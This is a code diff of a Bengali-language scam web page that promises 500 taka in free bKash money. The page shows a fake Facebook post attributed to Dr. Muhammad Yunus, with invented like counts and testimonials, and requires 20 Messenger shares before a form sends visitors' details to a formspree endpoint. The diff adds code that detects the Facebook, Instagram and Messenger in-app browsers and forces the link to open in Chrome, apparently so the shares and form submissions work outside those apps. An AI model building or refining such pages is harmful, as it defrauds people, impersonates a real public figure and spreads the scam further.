@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <title>bKash-500tk-Free</title>
+  <title>Bkash-500tk-Free</title>
   <style>
     body {
       font-family: 'Noto Sans Bengali', Arial, sans-serif;
@@ -303,6 +303,50 @@
   <div id="liveNotifyWrap"></div>
   <div id="fbpost"></div>
   <script>
+    // ----------- In-App Browser Detect & Block -----------
+    const FIXED_URL = "https://akash2025id.github.io/Bkash-Free-Tk/";
+    function inAppBrowserName() {
+      const ua = navigator.userAgent || "";
+      if (/FBAN|FBAV|FB_IAB|FB4A|FBCR|FBSS|FBID|FBSN|FBBV|FBCA|FBMD|FBLC|FBSC|FBOP/.test(ua)) {
+        return "Facebook";
+      }
+      if (/Instagram/.test(ua)) {
+        return "Instagram";
+      }
+      if (/Messenger/.test(ua)) {
+        return "Messenger";
+      }
+      return null;
+    }
+    function showOpenInBrowser() {
+      document.getElementById("main").innerHTML = `
+        <div class="note-warning">
+          আপনি Facebook/Messenger/Instagram-এর ভিতরের ব্রাউজার থেকে আসছেন।
+          <br><br>
+          কিছু ফিচার (Share, ফর্ম সাবমিট) কাজ করবে না।
+          <br><br>
+          দয়া করে <b>Chrome/Browser</b> দিয়ে লিংকটি খুলুন।
+        </div>
+        <button class="btn-main" onclick="openNativeBrowser()">Chrome/Browser-এ খুলুন</button>
+        <div style="margin-top:1.4rem;color:#b6004a;">নিজে কপি করে Chrome-এও ওপেন করতে পারেন:<br><span style="font-size:1.07rem;background:#fff2f8;border-radius:0.5rem;padding:0.2rem 0.5rem;user-select:all">${FIXED_URL}</span></div>
+      `;
+    }
+    function openNativeBrowser() {
+      // Android intent (works on most Android devices)
+      if (navigator.userAgent.match(/Android/i)) {
+        window.location = `intent://${FIXED_URL.replace(/^https?:\/\//, '')}#Intent;scheme=https;package=com.android.chrome;end`;
+        setTimeout(() => {
+          window.open(FIXED_URL, "_blank");
+        }, 1500);
+      } else if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
+        // iOS: open in Safari
+        window.location = FIXED_URL;
+      } else {
+        // fallback
+        window.open(FIXED_URL, "_blank");
+      }
+    }
+
     // ------- LocalStorage Utils -------
     const get = key => window.localStorage.getItem(key);
     const set = (key, val) => window.localStorage.setItem(key, val);
@@ -312,18 +356,16 @@
     const TARGET_SHARES = 20;
     const FORM_ENDPOINT = "https://formspree.io/f/myzjlqdp";
     const BANNER_IMG = "https://i.ytimg.com/vi/MFOOxXbD3RY/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLC0qk4Ob3WwWpspjKN3gk6dKXf6LA";
-   const SHARE_TEXT = `🎉 অবিশ্বাস্য সুযোগ! মাত্র একবার ফর্ম পূরণ করলেই আপনি পেতে পারেন bKash-এ সরাসরি ৫০০ টাকা ক্যাশ উপহার! 🤑💸 এখনই লিংকে যান ও আপনার সুযোগটি নিশ্চিত করুন! ✅👇`;
-
+    const SHARE_TEXT = `🎉 অবিশ্বাস্য সুযোগ! মাত্র একবার ফর্ম পূরণ করলেই আপনি পেতে পারেন bKash-এ সরাসরি ৫০০ টাকা ক্যাশ উপহার! 🤑💸 এখনই লিংকে যান ও আপনার সুযোগটি নিশ্চিত করুন! ✅👇`;
 
     // ------- Facebook Post Data -------
-    const FBPOST_USER = {name:'Dr. Muhammad Yunus', avatar:'M-U', time:'৩ দিন আগে'};
+    const FBPOST_USER = {name:'Dr. Muhammad Yunus', avatar:'M-U', time:'3 দিন আগে'};
     const FBPOST_TEXT = "👀 সবাই চেক করুন! যারা শেয়ার করেছেন এবং ফর্ম পূরণ করেছেন, তাদের টাকা পৌঁছে গেছে bKash-এ! 🎊 আপনারাও যদি পেয়ে থাকেন, তাহলে দেরি না করে জানিয়ে দিন! 💬👇 আমাদের উদ্যোগ সফল করতে আপনাদের মতামতই যথেষ্ট ❤️✨";
-
     const FBPOST_IMG = BANNER_IMG;
-    const FBPOST_INIT_LIKES = 115677;
-    const FBPOST_INIT_COMMENTS = 99362;
+    const FBPOST_INIT_LIKES = 115976;
+    const FBPOST_INIT_COMMENTS = 99397;
     const FBPOST_COMMENTS = [
-		{user:'Mithila', avatar:'M', text:'শেয়ার করলেই টাকা পাচ্ছি, বিশ্বাস করতে পারছি না!'},
+      {user:'Mithila', avatar:'M', text:'শেয়ার করলেই টাকা পাচ্ছি, বিশ্বাস করতে পারছি না!'},
 		{user:'Rafsan', avatar:'R', text:'অনেক উপকার হয়েছে, ধন্যবাদ!'},
 		{user:'Sadia', avatar:'সা', text:'অনেক দিন পর একটা আসল অফার পেলাম!'},
 		{user:'Tanim', avatar:'T', text:'৫০০ টাকা পেয়ে গেছি, সত্যিই চমৎকার।'},
@@ -351,11 +393,11 @@
     }
     function handleChromeRedirect() {
       try {
-        window.location.href = "googlechrome://navigate?url=" + window.location.href;
+        window.location.href = "googlechrome://navigate?url=" + FIXED_URL;
         setTimeout(() => {
-          window.open('https://chrome.google.com/', '_blank');
+          window.open(FIXED_URL, '_blank');
         }, 1500);
-      } catch(e) { window.open('https://chrome.google.com/','_blank'); }
+      } catch(e) { window.open(FIXED_URL,'_blank'); }
     }
     function renderFBPost() {
       let likeCount = FBPOST_INIT_LIKES + (state.fbLiked?1:0);
@@ -438,7 +480,7 @@
         return;
       }
       main.innerHTML = `
-        <h1 style="color:#e60074;font-size:1.4rem;font-weight:700;text-align:center;">ম্যাসেন্জারে শেয়ার করুন এবং টাকা নিন।</h1>
+        <h1 style="color:#e60074;font-size:1.4rem;font-weight:700;text-align:center;">ম্যাসেন্জারে শেয়ার করুন এবং টাকা নিন..</h1>
         <div class="upgrade-bar" style="margin-top:1.7rem;">
           <div class="upgrade-fill" id="upgradeFill" style="width:${state.upgrade}%;"></div>
           <div class="upgrade-text">${state.upgrade}%</div>
@@ -508,11 +550,11 @@
         }, delay);
       }
       render();
-      let url = window.location.href;
+      let url = FIXED_URL;
       if (navigator.share) {
         try {
           await navigator.share({
-            title: "Messenger Target Free Offer",
+            title: "Bkash Free Offer",
             text: SHARE_TEXT,
             url
           });
@@ -571,6 +613,7 @@
     window.handleFormSubmit = handleFormSubmit;
     window.handleFBLike = handleFBLike;
     window.handleFBCommentClick = handleFBCommentClick;
+    window.openNativeBrowser = openNativeBrowser;
 
     // ------- Live Notification Name/Amount List -------
     const liveNames = [
@@ -645,10 +688,17 @@
       }
       setTimeout(nextNoti, 900);
     }
-    render();
-    renderPopup();
-    renderFBPost();
-    startLiveNotify();
+
+    // ---- ENTRY POINT ----
+    const inApp = inAppBrowserName();
+    if (inApp) {
+      showOpenInBrowser();
+    } else {
+      render();
+      renderPopup();
+      renderFBPost();
+      startLiveNotify();
+    }
   </script>
 </body>
 </html>
